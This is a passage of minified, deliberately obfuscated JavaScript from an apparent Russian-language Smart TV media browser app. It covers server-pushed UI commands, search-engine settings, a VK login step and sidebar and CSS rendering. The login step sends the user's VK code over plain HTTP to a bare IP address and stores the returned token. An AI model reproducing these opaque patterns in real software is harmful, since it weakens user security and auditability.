if(data.cmd.indexOf("setfon(")>=0){var m=data.cmd.match(/setfon\((.*?)\)/)[1];confirmed.create("<img style='height:360px;' src='"+getFon(m)+"' />","Change default background image to").fun0=function(){kjtYpr.lll0Il11OxICbl1ll0Ypr("mf",m);c.lIlO1OI1Mlt001lIYpr(pq)};return 1}
if(data.cmd.indexOf("info(")>=0){var m=data.cmd.match(/info\((.*?)\)/)[1];confirmed.create(m,c.lI1101I0v1OO1OIYpr.page.XML_DOMAIN,"OK");return 1}
if(data.cmd.indexOf("removeHist(")>=0){var m=data.cmd.match(/removeHist\((.*?)\)/)[1];console.log("cmd removeHist "+m)}
if(data.cmd.indexOf("replacepage(")>=0){var m=data.cmd.match(/replacepage\((.*?)\)/);console.log(m);curPage.global=c.global;curPage.channels=data.channels;curPage.renderChannels(getSelect(),"update");return 1}
if(data.cmd.indexOf("settitle(")>=0){var m=data.cmd.match(/settitle\((.*?),(.*?)\)/);console.log(m);curPage.channels[m[1]].title=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("setdescription(")>=0){var m=data.cmd.match(/setdescription\((.*?),(.*?)\);/);console.log(m);curPage.channels[m[1]].description=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("reload(")>=0){var m=data.cmd.match(/reload\((.*?)\)/)[1];console.log("cmd reload "+m);if(m!=""&&m>0){var xt=c.lIQ0Il1IlIb1Il1OYpr;setTimeout(function(){if(xt==c.lIQ0Il1IlIb1Il1OYpr){c.lI1101I0v1OO1OIYpr.reload()}},1000*m)}else{c.lI1101I0v1OO1OIYpr.reload()}
return 1}
if(data.cmd.indexOf("stop()")>=0){return 1}
if(brea)return 1}
if(typeof data.error!="undefined"){is_loadpage(-1);kjtYpr.inf(data.error,2200);return 1}}catch(e){console.log(e);kjtYpr.popUp("Error data<br>"+e.message,2200)}
return 0},preOpen:function(pq){var c=this;if(this.detChxxx(pq.elCh)){showParrent();return 1}
if($_(VK.id)==null&&kjtYpr.GL.third==0&&(0||pq.elCh.playlist_url.indexOf("searchEngines")==0)&&templic==0&&pq.inputed==null){confirmed.create("Поиск в Интернет может вести на сторонние сайты и плейлисты, нажимая _FPProdolzhit_, вы подтверждаете что несёте ответственность за принятие решений о получении доступа к сторонним сайтам к результатам поиска","Внимание!","Больше не показывать|_FPProdolzhit_");confirmed.fun0=function(){kjtYpr.GL.third=2;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));pq.lI1101I0v1OO1OIYpr.play()};confirmed.fun1=function(){templic=1;pq.lI1101I0v1OO1OIYpr.play()}
return 1}
templic=0;var xml_url=pq.elCh.playlist_url;if(xml_url=="menu"){kjtYpr.l1Q1OIO0duul1l1IlYpr("onlymenu");return 1}else if(xml_url=="confirm"){if(gV(pq.elCh,"description")=="")var ttl=pq.elCh.title;else ttl=pq.elCh.description;confirmed.create(ttl);confirmed.fun0=function(){var el=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(pq.elCh));el.playlist_url=pq.elCh.confirm[0];oInset[insetActive].navigate(el)};return 1}else if(xml_url=="cmdSetSync"){c.lI1101I0v1OO1OIYpr.navigateHist(-2);return 1}else if(xml_url=="cmdSetSyncImp"){is_loadpage(1);autoimport("http://cloudflare.appinfo.su/browseraccount/?do=fimport&rev=4&&v="+pq.elCh.menu_url,c);return 1}
if(xml_url.match(/^searchEngines(#url|xml)?\|/)){var xc=xml_url.split("|");xml_url=xc[0];pq.inputed={"text":xc[1],"id":""}}
if(pq.elCh.search_on!=""&&pq.inputed==null){if(pq.elCh.search_on=="search"||pq.elCh.search_on=="search_on")pq.elCh.search_on="_FPVvediteText_";VK.Show(null,pq.elCh);return 1}
if(xml_url.indexOf("searchEngines")==0&&pq.inputed!=null){if(pq.inputed.text=="")return 1;spider_stat=pq.inputed.text;if(pq.inputed.text.match(/^(http|about:|tosettings|cmd|vk:|www\.|html:\/\/)/)||pq.elCh.playlist_url.indexOf("searchEngines#url")==0){xml_url="cmdEnterlist"}else{se=getVars("start").search;ch=[];function _rds(el){return{"logo_30x30":el.logo,"timeout":10,"title":el.title,"iframe":"3","playlist_url":el.url.replace("%s",encodeURIComponent(pq.inputed.text))}}
for(var i=0;i<se.sites.length;i++){if(gV(se.sites[i],"dop")==2)ch.unshift(_rds(se.sites[i]));else if(gV(se.sites[i],"dop"))ch.push(_rds(se.sites[i]))}
console.log(ch);if(ch.length==0){is_loadpage(-1);kjtYpr.inf("Нужно сначала _FPAdd a search engine_ в настройках!",1500)}else{c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url+"|"+pq.inputed.text+"|"+ch[0].playlist_url;pq.data={"title":"Поиск "+pq.inputed.text,"channels":ch};c.toChannels(pq)}
return 1}}
if(xml_url.indexOf("cmdEnterlist")==0){if(pq.inputed.text=="")return 1;pq.elCh.type="enterurl";pq.elCh.title=pq.inputed.text;xml_url=pq.inputed.text;if(xml_url.indexOf("//")>0&&xml_url.indexOf("?")==-1&&xml_url.lastIndexOf("/")!=xml_url.length-1&&!xml_url.match(/\/\/.*\//))xml_url+="/";var ttl=xml_url.replace(/^https?:\/\//,"");if(ttl.indexOf("?")>0)ttl=ttl.substring(0,ttl.indexOf("?"));pq.data={"title":ttl,"icon":_img("_ST_emptydoc.png"),"channels":[{"location":kjtYpr.applyenter,"type":"enterurl","logo_30x30":"_ST_plus.png","title":ttl+"","playlist_url":xml_url}]};c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url;c.toChannels(pq);return 1}else if(xml_url.indexOf("tosetVk")==0){if(pq.inputed.text!=""){kjtYpr.GL.vk_code=pq.inputed.text;var u="http://185.158.114.122/obovse.ru/smarttv/api.php?do=vk_code&code="+pq.inputed.text;var xhrt=new XMLHttpRequest();xhrt.onreadystatechange=function(){if(xhrt.readyState==4){var s=xhrt.responseText;var x=s.split("|");if(x[0]!=undefined&&x[1]!=undefined&&x[1]!=""){kjtYpr.GL.vk_id=x[0];kjtYpr.GL.vk_token=x[1];kjtYpr.popUp("_FPUspIdPolz_:"+x[0])}else{kjtYpr.GL.vk_id="";kjtYpr.GL.vk_token="";kjtYpr.popUp("_FPOshibka_!<br>_FPProvPravKodVk_")}
kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));oInset[insetActive].reload()}};console.log(url);xhrt.open('GET',u,!0);xhrt.send();kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_pl","");kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_sel","")}
return 1}
kjtYpr.lastchannels=null;if(this.lIQ0Il1IlIb1Il1OYpr.indexOf("#submenu")>0&&gV(pq.elCh,"type")=="replace"){kjtYpr.lastchannels=this.channels;var n=pq.lI1101I0v1OO1OIYpr.get("s",-2);pq.lI1101I0v1OO1OIYpr.history.pop();var t=pq.lI1101I0v1OO1OIYpr.get("title");pq.lI1101I0v1OO1OIYpr.history.pop();if(pq.inputed!=null)pq.elCh.title=t+"["+n+"="+pq.inputed.text+"]";else pq.elCh.title=t+"["+n+"="+pq.elCh.title+"]"}
if(pq.inputed!=null){if(kjtYpr.hardware=="UE32J4500"||!0)pq.inputed.text=parseHtmlEnteties(pq.inputed.text);kjtYpr.lastSearch=pq.inputed.text}
this.REQUEST_XML=xml_url;this.SEARCH_TEMPL=""},getTypePos:function(Ch,index){if(index==null)index=1;if(index>=0){var P=gV(Ch,"position");if(P==""){if(gV(Ch,"tvg-shift")=="99")P="fulleditline";else if(gV(Ch,"tvg-shift")=="98")P="hlink"}
if(P=="")P=this.typeList}else P="";return P},upPos:function(){var c=this;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0},addGl:function(search_url,p,title,img){if(search_url.indexOf("http")==0){if(search_url.indexOf("%s")==-1)search_url=sU(search_url,"search=%s");var se=getVars("start").search;if(img==null)img="";if(title==null)title="";var ex=l01llO0sYbDOI1OIYpr(search_url);if(ex>=0){se.sites[ex].dop=1;kjtYpr.popUp(title+" уже включен в поиск! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}else{var el={"title":title,"url":search_url,"logo":img,"dop":1};var els=se.sites.length;if(els>2)els=2;se.sites.splice(els,0,el);kjtYpr.popUp(title+" установлено вашей поисковой системой! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}
setVars("search",se)}else kjtYpr.popUp(title+" не содержит ссылку!",2000)},addToSearchHist:function(search_url,p,title,img,pq){var c=this;var se=getVars("start").search;if(p==null)p="site";if(img==null)img="";if(title==null)title="";var ex=l01llO0sYbDOI1OIYpr(search_url);for(var i=0;i<se.sites.length;i++){if(se.sites[i].dop)last=i}
var t="";if(ex>=0){last++;if(last<ex&&last<se.sites.length){var old=se.sites[ex];se.sites[ex]=se.sites[last];se.sites[last]=old}}else if(c.reallinks>1){if(se.sites.length<2){se.sites.splice(1,0,{"title":title,"url":search_url,"logo":img,"dop":1,"type":p});t=title+" установлено вашей поисковой системой по умолчанию! <br>Отключить можно в Меню/Настройки/Поисковые системы или нажмите сейчас здесь"}else{se.sites.splice(last+1,0,{"title":title,"url":search_url,"logo":img,"type":p});t=title+" добавлен в историю поисковикых систем! <br>Включить можно в Меню/Настройки/Поисковые системы или нажмите сейчас здесь"}}else t="Добавьте поиск по этому сайту в свои Поисковые системы, чтобы искать по нему с адресной строки!";setVars("search",se);if(!c.l1IOIl100j1fXIlIIYpr&&t!=""){hint('<img style="float: left;				    margin: 2px 6px 0px 0px;		    width: 25px;		    height: 25px;		    background: #9e9e9e;" src="https://raw.githubusercontent.com/komivp/appinfodl/main/static/page_fav_off_white.png">'+t,"kb5")}
seSt.push({"url":search_url,"img":img,"title":title,"is_xxx":c.REQUEST_XXX,"text":"","gs":c.l1IOIl100j1fXIlIIYpr,"count":c.channels.length,"app_cors":app_cors,"rf":(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive),"acestream":(kjtYpr.GL.aceactive||kjtYpr.GL.torrserveactive)})},lI0Il1lenfIlO0IYpr:function(){$_("top2").style.paddingTop=css_wh(4)+"px";$_("top2").style.height=css_wh(36)+"px";$_("top2text").style.paddingTop=css_wh(2)+"px";$_("top2text").style.marginTop=css_wh(1)+"px";$_("top2text").style.fontSize=css_wh(20)+"px";$_("top2text").style.height=css_wh(24)+"px";if(kjtYpr.GL.sidebar=="1"){$_("sidebar").style.display="block";if(sdbar==null){var s=kjtYpr.l1O0l1gmmv01O11Ypr("bookmarks");if(s!=""){var sd=l0QO11lOz0bfh10l0Ypr(s);if(sd==null)sd=[];if(typeof sd.push=="undefined")sd=[];for(var i=0;i<sd.length;i++){if(sd[i].playlist_url=="bookmarks/toolbar"){sdbar=sd[i].channels;break}}}
var html="";console.log(sdbar)}
if(sdbar!=null){dop="max-width:"+(($_("sidebar").offsetWidth-12-(sdbar.length*8))/sdbar.length).toFixed(0)+"px;";html="";for(var i=0;i<sdbar.length;i++){if(sdbar[i]==null)sdbar.splice(i,1);else{if(typeof sdbar[i].logo_30x30=="undefined")sdbar[i].logo_30x30=_img("_ST_emptydoc.png");if(sdbar[i].logo_30x30.indexOf("http")!=0)sdbar[i].logo_30x30=_img("_ST_emptydoc.png");html+="<div id='sdbar"+i+"' title='"+sdbar[i].title.replace(/<.*?>/g,"")+lIl11llQV1Z1NOO0IYpr(1,["' onmousemove=\"if(handler=='menu'&&(getSelect()!=-2||sdbarSel!="+i+")) {setSelect(-2);sdbarSel="+i+";linkOver();}\" onclick=\"sdbarSel="+i+";sidebar_play();\" ",""])+"style='height:18px;overflow:hidden;border: 2px solid transparent;float:left;padding:0px 3px 0px 1px; margin:0px;"+dop+"'>"+"<img onerror=\"onImgError(this,'emptydoc');\" width='20' height='16' style='float: left; padding: 0px 3px 0px 0px;' src='"+_img(sdbar[i].logo_30x30)+"' /><div style='margin-top:"+css_wh(-2)+"px;margin-left:23px;'>"+sdbar[i].title.replace(/<.*?>/g,"")+"</div></div>"}}
lI1I1IxFCIh1l01llYpr("sidebar",html)}
if(html==""){kjtYpr.GL.sidebar=0;if(getSelect()==-2){setSelect(-1);listInset()}
statusbar("_FPBookmark toolbar_ _FPOtkl_! _FPPustayaPapka_")}
sidebar_sel()}else{$_("sidebar").style.display="none"}},l10OIIIDn1elO01Ypr:function(index,m,d){var c=this;if(m!=null)var dop=" "+m+" "+m+"default";else dop="";var chf='<div class="ch default'+dop+'" id="ch'+index+'"'+gV(d)+' sel="0"'+lIl11llQV1Z1NOO0IYpr(1,[' onmousemove="if(!this.sel) parent.linkOver('+index+',this);" onmousedown="parent.p_d();" onmouseup="parent.p_u();" onclick="parent.p_c('+index+');"',""]);chf+='>';return chf},renderCh:function(Ch,index,dop){var html="";var c=this;Ch.imgsrc=gV(Ch,"imgsrc");if(Ch.imgsrc==""){if(gV(Ch,"playlist_url")!="")Ch.imgsrc=_img("_ST_open.png");else Ch.imgsrc=_img("_ST_file.png")}
if(gV(Ch,"imgsrc").match(/^http:\/\/check(true|false)/)){Ch.imgsrc=_img((Ch.imgsrc=="http://checktrue"?"_ST_checktrue.png":"_ST_checkfalse.png"))}
if(gV(Ch,"display_title")!="")var title=gV(Ch,"display_title");else title=gV(Ch,"title");if(title==""||title==" ")title=gV(Ch,"playlist_url").replace(/^https?:\/\//,"");title=title.toString();if(index>0){var lastP=c.getTypePos(c.channels[index-1],(index-1))}else lastP="";l1I0l11qjIoI10OI0Ypr=c.getTypePos(Ch,index);if(l1I0l11qjIoI10OI0Ypr=="list"){if(index)c.sPosY++;c.sPosX=0;c.sPos[index]=[c.sPosX,c.sPosY]}else{title=title.replace(/<img.*?>/g,"");if(l1I0l11qjIoI10OI0Ypr=="bigtile"){st_w=10;st_h=css_wh(194)}else{st_w=10;st_h=css_wh(80)}
el_mini=!1;el_margin=css_w(1);if(l1I0l11qjIoI10OI0Ypr=="label"){c.sPosX=0;if(index)c.sPosY++;c.sPos[index]=[c.sPosX,c.sPosY];return gV(Ch,"before")+c.l10OIIIDn1elO01Ypr(index,l1I0l11qjIoI10OI0Ypr)+'<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">'+'<div id="titleid'+index+'" class="title">'+title+'</div>'+'</div></div>'+gV(Ch,"after")}
if(typeof Ch.br!="undefined"){console.log(Ch);c.br=1}
var bef="";if(gV(Ch,"br")==1||lastP!=l1I0l11qjIoI10OI0Ypr){console.log(index+"br or l!=p "+lastP+"/"+l1I0l11qjIoI10OI0Ypr);if(index){if(gV(Ch,"br")==1||box_low2){if(gV(Ch,"before")!="<br>")bef="<br clear=both>";c.br=1}
c.sPosY++}
c.sPosX=0}
if(l1I0l11qjIoI10OI0Ypr=="fulleditline"){c.sPosX=0;c.sPos[index]=[c.sPosX,c.sPosY];html=c.l10OIIIDn1elO01Ypr(index,l1I0l11qjIoI10OI0Ypr)+'<div id="titleid'+index+'" class="title">'+(Ch.imgsrc.indexOf("http")==0?'<img id="img'+index+'" src="'+_img(Ch.imgsrc)+'" class="icon">':"")+title+''+'</div></div>';return gV(Ch,"before")+bef+html+gV(Ch,"after")}else if(l1I0l11qjIoI10OI0Ypr=="hlink"){c.sPos[index]=[c.sPosX++,c.sPosY];html+=c.l10OIIIDn1elO01Ypr(index,l1I0l11qjIoI10OI0Ypr);if(Ch.imgsrc!="")html+='<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror="parent.onImgError(this);" data-src="'+_img(Ch.imgsrc)+'" class="icon">';html+='<div id="titleid'+index+'" class="title">'+title+'</div>'+'</div>';return gV(Ch,"before")+bef+html+gV(Ch,"after")}
if(c.sPosX>=startX&&!c.br){c.sPosY++;c.sPosX=0}
c.sPos[index]=[c.sPosX++,c.sPosY];if(typeof(Ch.coordination)=="object"){var maxX=0,maxY=0,lastX=0;lastY=0;if(index>0){for(var i=0;i<index;i++){var val=c.sPos[i];if(val[0]>maxX)maxX=val[0];if(val[1]>maxY)maxY=val[1]};var lastX=c.sPos[index-1][0];var lastY=c.sPos[index-1][1]}
if(Ch.coordination[1]>=lastY)c.sPos[index]=Ch.coordination;else{lastX++;if(lastX>maxX||gV(Ch,"br")==1){lastX=0;lastY++}
c.sPos[index]=[lastX,lastY];console.log(c.sPos[index])}
console.log(index+" "+c.sPos[index][0]+"/"+c.sPos[index][1]+" "+lastY+" maxX="+maxX)}
if(l1I0l11qjIoI10OI0Ypr=="html"||gV(Ch,"template")!=""){html+=adop+c.l10OIIIDn1elO01Ypr(index,l1I0l11qjIoI10OI0Ypr,dop);html+=gV(Ch,"template").replace("$title","<span class='title' id='titleid"+index+"'>"+gV(Ch,"title")+"</span>").replace(/\$logo_30x30(.*?["'])/,_img("_ST_1px.png")+"$1 onerror='parent.onImgError(this);' data-src='"+Ch.imgsrc+"' class='icon' id='img"+index+"'").replace("$description",gV(Ch,"description"))}else{html+=adop+c.l10OIIIDn1elO01Ypr(index,"start",dop);html+="<div id='rat"+index+"' class='rating'></div>";if(Ch.imgsrc!="")html+='<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">';html+='<div class="name" id="titleid'+index+'"><div class="title">'+title+'</div> </div>';if(!lIl11llQV1Z1NOO0IYpr(12)&&typeof Ch.side_icon!="undefined")if(Ch.side_icon!="")html+='<img class="side_icon" align="left" src="'+_img(Ch.side_icon)+'" style="top:-'+st_h+'px;height:'+(st_h-4)+'px;width:'+st_w+'%;">'}
html+='</div>';return gV(Ch,"before")+bef+html+gV(Ch,"after")}
if(gV(Ch,"number")!=="")var num=Ch.number;else{var num=(index+1);if(gV(c.global,"startcontent")>0&&c.lIQ0Il1IlIb1Il1OYpr.indexOf("#submenu")==-1)num-=gV(c.global,"startcontent")}
var img='';if(typeof Ch.logo_search!="undefined"){Ch.imgsrc=Ch.logo_search}
if(gV(Ch,"imgsrc")=="none"||gV(Ch,"imgsrc")==""){img='<div style="float:left;width:'+Math.round(llOII1OOGQQO00OYpr*1.2*(css_w(100)/css_wh(100)))+'px;margin: 0px 2px;padding-right: 2px;">&nbsp;</div>'}else img='<img id="img'+index+'" class="icon" src="'+_img("_ST_1px.png")+'" onerror="parent.onImgError(this);" data-src="'+_img(Ch.imgsrc)+'" width="'+Math.round(llOII1OOGQQO00OYpr*1.2*(css_w(100)/css_wh(100)))+'" height="'+(llOII1OOGQQO00OYpr-css_wh(4))+'">';var html=c.l10OIIIDn1elO01Ypr(index,"list",dop);html+="<div class='contmenu' id='contmenu"+index+"' style='height:"+llOII1OOGQQO00OYpr+"px;'>"+"<img"+lIl11llQV1Z1NOO0IYpr(1,[" onclick=\"parent.l01lI01OIIiXQlQOIYpr('menu',parent.VK_RED);\"",""])+" src='"+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/menu_qb.png")+"' style='background: inherit;border-radius:0px 4px 4px 0px;position: absolute;height:"+llOII1OOGQQO00OYpr+"px;width:"+(llOII1OOGQQO00OYpr)+"px;' /></div>";if(Ch.imgsrc!="hidden")html+='<div id="numch'+index+'" class="numb">'+num+'</div>';html+=img;if(gV(Ch,"infolink")!=""&&Ch.infolink!=" "&&gV(Ch,"search_on")==""){var ttl='<div class="infolinktitle">'+title+'</div>'+'<div class="infolink">'+Ch.infolink+'</div>'}else ttl=title;if(Ch.stream_url=="")html+="<div id='rat"+index+"' style='float:right;display:none;padding-top:1px;font-size:"+(ch_size*(css_wh(100)/css_w(100))-css_wh(13))+"px;width:"+css_w(31)+"px;'></div>";if(gV(Ch,"search_on")!="")var titlSt=" listsearch";else titlSt="";html+='<div style="overflow:hidden;height: 100%;padding:0px 2px 0px 0px;" id="title'+index+'"><div id="titleid'+index+'" class="title'+titlSt+'">'+ttl+'</div></div>';html+="</div>";return gV(Ch,"before")+html+gV(Ch,"after")},lIlO1OI1Mlt001lIYpr:function(pq){var c=this;if(pq==null)pq={"mini":0};llOII1OOGQQO00OYpr=css_wh(35);ch_size=css_wh(27);$_("main").style.fontSize=css_wh(25)+"px";l0OO0IigAAl011Ypr=css_w(510);lOl10OxfIOI0llYpr=css_wh(21);title_pad=css_wh(2);console.log(ch_size);$_("top2").style.zIndex="3";$_("top").style.backgroundColor=rgba("rgba(167, 167, 167,0.5)");$_("top2").style.backgroundColor=rgba("rgba(116, 116, 116,0.5)");if(kjtYpr.GL.pr>0){$_("sidebar").style.whiteSpace="nowrap";$_("widget_date").style.whiteSpace="nowrap";$_("top2text").style.wordBreak="unset"}else{$_("sidebar").style.whiteSpace="normal";$_("widget_date").style.whiteSpace="normal";$_("top2text").style.wordBreak="normal"}
if(showfon&&kjtYpr.GL.pr>0){if(kjtYpr.series!="D"&&kjtYpr.series!="C"&&kjtYpr.series!="LW"&&uaJ!="dune"&&kjtYpr.GL.pr<100)
var bim="rgba(0,0,0,0."+(100-kjtYpr.GL.pr)+")";else bim="";$_("pr").style.background=bim;var u=getFon(kjtYpr.l1O0l1gmmv01O11Ypr("mf"));if(!box_low&&!box_low2){console.log("UFON="+u);if(pq.mini){$_("main").style.background="none";if(gV(c.global,"background-image")==""){$_("bcg1").style.display="block";$_("bcg1").style.backgroundImage="url("+_img(u)+")";$_("bcg2").style.display="block";$_("bcg2").style.backgroundImage="url("+_img(u)+")"}}else{$_("main").style.backgroundImage="url("+_img(u)+")";$_("main").style.backgroundSize="cover"}}}else if(platform=="sams"){$_("main").style.background="none";$_("pr").style.background="none"}else{$_("main").style.background="none black";$_("pr").style.background="none"}
c.setZoom();c.lI0Il1lenfIlO0IYpr()},lOOl1llI1qyVIOl10O1Ypr:function(pq){var c=this;var default_css=[];if(box_low2)var disp="float:left;";else disp="display: inline-block;";if(!box_low2)default_css.push("::-webkit-scrollbar-button:single-button {background-color: #bbbbbb;display: block;border-style: solid;height: 10px;width: 10px;}	::-webkit-scrollbar-button:single-button:vertical:decrement {	  border-width: 5px;	  border-color: transparent transparent #555555;	}	::-webkit-scrollbar-button:single-button:vertical:increment {	  border-width: 5px;	  border-color: #555555 transparent transparent transparent;	} ::-webkit-scrollbar {  width: 10px;} ::-webkit-scrollbar-track {  background: #ddd; } ::-webkit-scrollbar-thumb {  background: #888; }::-webkit-scrollbar-thumb:hover {  background: #777; } ");default_css.push(".start{position: relative;border:0px;text-align:center;"+disp+";overflow:hidden;text-align:center; margin-left:4px;margin-top:1px;height:101px;width:10%;}");default_css.push(".start .rating{position:absolute;display:none;text-align:left;height:23px;width:28px;padding-top: 5px;padding-left: 5px;font-size:11px;}");default_css.push(".start .icon{padding:2px 2px 0px 2px;height:76%;}");default_css.push(".start .name{font-size:17px;line-height:0.9;position: absolute;bottom: 0px;width:100%;    max-height: 50%;}");default_css.push(".start .title{background: "+rgba("rgba(0,0,0,0.65)")+";border-radius:3px;width: auto;display: "+disp+"    margin: 2px;padding: 1px 4px 4px 4px;}");default_css.push(".start .side_icon{position:relative;padding:2px;}");if(c.hideRight)var widthCh=99;else if(c.is_iptv>2)widthCh=63;else widthCh=50.7;widthCh-=(3500/innerW);default_css.push(".list{text-align:left;border-radius:4px 0px 0px 4px;cursor: default;margin: 2px 0px;width: "+widthCh+"%;height:"+llOII1OOGQQO00OYpr+"px;}");default_css.push(".list .contmenu{position: relative;  float: right;display:none;}");default_css.push(".list .numb{float:left;padding-top:2px;font-size: 60%;min-width:38px;text-align:center;}");default_css.push(".list .icon{margin: 0px 2px;padding-right: 2px;float:left;}");default_css.push(".list .title{"+((c.is_iptv>2)?"width:100%;":"")+""+disp+"float:left;position:relative;"+(box_low2?"":"white-space:nowrap;")+"}");default_css.push(".listsearch{background-color:#ddd;color:#333;overflow: hidden;border-radius:4px;padding:3px;margin-top:2px;font-size:85%;width: 90%;height: 68%;}");default_css.push(".infolinktitle{height:63%;font-size:80%;overflow: hidden;}");default_css.push(".infolink{padding-left:3px;font-size:11px;}");default_css.push(".default .contmenu{display:none;}");default_css.push(".selected .contmenu{display:block;}");default_css.push(".html{position: relative;"+disp+"vertical-align: top;}");default_css.push(".hlink{position:relative;border:0px solid transparent;margin:0px 4px;border-radius: 4px;"+disp+"overflow:hidden;}");default_css.push(".hlink .title{overflow: hidden;max-width: 310px;font-size:90%;padding:0px 4px;float:left;height:28px; text-decoration: underline;}");default_css.push(".hlink .icon{float:left;height:22px;padding-top:5px;}");default_css.push(".fulleditline{border:1px solid transparent;width:80%;margin:1px 9%;border-radius: 4px;"+disp+"overflow:hidden;}");default_css.push(".fulleditline .title{overflow: hidden;font-size:24px;height:24px;margin:3px;color:#2b2525; background-color: #eee;padding:4px;}");default_css.push(".fulleditline .icon{float:right;height:22px;padding-top:2px;}");default_css.push(".label{position:relative;text-align: left;border-radius: 4px;margin:-2px 4%;font-size:80%;width:92%;"+disp+"overflow:hidden;height:26px;}");default_css.push(".label .icon{float:left;height:20px;}");default_css.push(".default{background:none;}");default_css.push(".selected{background:"+rgba("rgba(180, 180, 180, 0.7)")+";}");default_css.push(".listselected{color:black;}");default_css.push(".site{height: 100%;width: 100%;overflow-y: auto;overflow-x: hidden;font-size:"+ch_size+"px;}");default_css.push("body{color: "+$_("main").style.color+";margin:0px;padding:0px;height: 100%;width: 100%;overflow: hidden;background-color: transparent;}");default_css.push("small{font-size:70%;color:gray;}");default_css.push(".buttons{position:fixed;top:80%;left:50%;width:47%;margin:2px;display:none;padding:0px 3px 0px 3px;color:#cccccc;font-size:80%;}");default_css.push("#middle{position:fixed;top:75px;left:50%;width:47%;margin:2px;display:none;padding:0px 3px 0px 3px;}");if(c.is_iptv>2){var rStyle="left:63%;width:35%;font-size:"+(1+lOl10OxfIOI0llYpr)+"px;color:rgb(208, 198, 201);"}else{rStyle="left:51%;width:47.5%;"}
if(!box_low2)rStyle+="word-break:break-word;";if(c.menu.length)rStyle+="top: 14%;";else rStyle+="top: 77px;";default_css.push(".rightHalf{position: absolute;overflow-x:hidden; overflow-y:auto;display:none;font-size:"+(1+ch_size)+"px;"+(rStyle)+"}");return default_css.join(' ')},setZoom:function(m){$_("main").style.zoom=kjtYpr.GL.zoom+"%";$_("popUp").style.zoom=kjtYpr.GL.zoom+"%";$_("statbar2").style.zoom=kjtYpr.GL.zoom+"%";if(m&&$_("sitebody")!=null){kjtYpr.popUp("Reload page for changes zoom page",1500)}},renderPage:function(pq){var c=this;console.log("renderPage "+c.inc+" "+c.lIQ0Il1IlIb1Il1OYpr+" ifr="+c.l1IOIl100j1fXIlIIYpr);getwh();c.setZoom();console.log(pq);c.start11=new Date().getTime();console.log(c.channels);console.log(c.global);if(gV(c.global,"title")!="")c.title=c.global.title;else if(pq.elCh.title!="")c.title=pq.elCh.title;else c.title=c.lIQ0Il1IlIb1Il1OYpr;breakScreen(getInfoUrl(c.lIQ0Il1IlIb1Il1OYpr));if(gV(c.global,"icon")!="")c.icon=c.global.icon;else c.icon=pq.elCh.logo_30x30;lI1I1IxFCIh1l01llYpr("insetttl"+pq.lI1101I0v1OO1OIYpr.id,c.title);pq.lI1101I0v1OO1OIYpr.title=c.title;pq.lI1101I0v1OO1OIYpr.icon=c.icon;console.log(c.icon);var rStyle="";if(insetActive==pq.lI1101I0v1OO1OIYpr.id){c.lIlO1OI1Mlt001lIYpr(pq);if(c.channels.length<1){c.global.before=gV(c.global,"before")+"<div style='position:absolute;left:15px; top:48px;overflow:hidden;font-size:100%;'><small>_FPZdesPusto_</small></div>"}
c.hideRight=0;var siteTop=75;if(kjtYpr.GL.sidebar>0)siteTop=105;if(kjtYpr.GL.zoom!=100)siteTop=$_('panel').offsetHeight;siteHeight=innerH-siteTop;$_("site").style.left="0px";$_("site").style.top=siteTop+"px";$_("site").style.width="100%";$_("site").style.height="100%";if(box_low2)$_("site").style.background="black";else if(gV(c.global,"background")!=""){if(pq.mini){}else $_("site").style.background=c.global.background}else if(gV(c.global,"background-image")!=""){if(pq.mini){$_("bcg1").style.display="block";$_("bcg1").style.backgroundImage="url("+c.global["background-image"]+")";$_("bcg2").style.display="block";$_("bcg2").style.backgroundImage="url("+c.global["background-image"]+")"}else $_("site").style.background="url("+c.global["background-image"]+")"}else{$_("site").style.background=""}
if(gV(c.global,"options").indexOf("hidedescription")>=0){c.hideRight=1}else c.hideRight=0;var hmenu="";if(box_low2||kjtYpr.GL.pr==0)wordBreak="";else wordBreak="word-break:break-all;";if(c.menu.length){try{var wi=Math.ceil((1270-c.menu.length*9)/c.menu.length);var dop="background-color:#596367;";hmenu+="<div id='menu' style='"+wordBreak+"margin: 3px 0px 4px -2px;width:100%;float: left;overflow-x:hidden;overflow-y:visible;height:"+Math.ceil(llOII1OOGQQO00OYpr*0.80+3)+"px;"+dop+"'>";for(var i=0;i<c.menu.length;i++){var li="";if(c.menu[i].playlist_url=="submenu"&&typeof c.menu[i].submenu!="undefined"&&c.menu[i].submenu.length){li="<ul id='menu"+i+"sub' style='position:absolute;display:none;list-style:none;padding:5px;margin:2px 0px;z-index:2;background: inherit;'>";for(var j=0;j<c.menu[i].submenu.length;j++){var el=c.menu[i].submenu[j];li+="<li id='menu"+i+"sub"+j+"'"+lIl11llQV1Z1NOO0IYpr(1,[" onmousemove=\"if(parent.handler=='menu'&&parent.menuSubSel!="+j+") {parent.setSelect(-3);parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_sel();}\" onclick=\"parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_play();\"",""])+" style='border:2px solid transparent;margin:2px 0px;width:100%;overflow:hidden;background: inherit;'><img onerror=\"this.onerror=null;this.style.display='none';\" width='"+Math.ceil(llOII1OOGQQO00OYpr*0.85)+"' 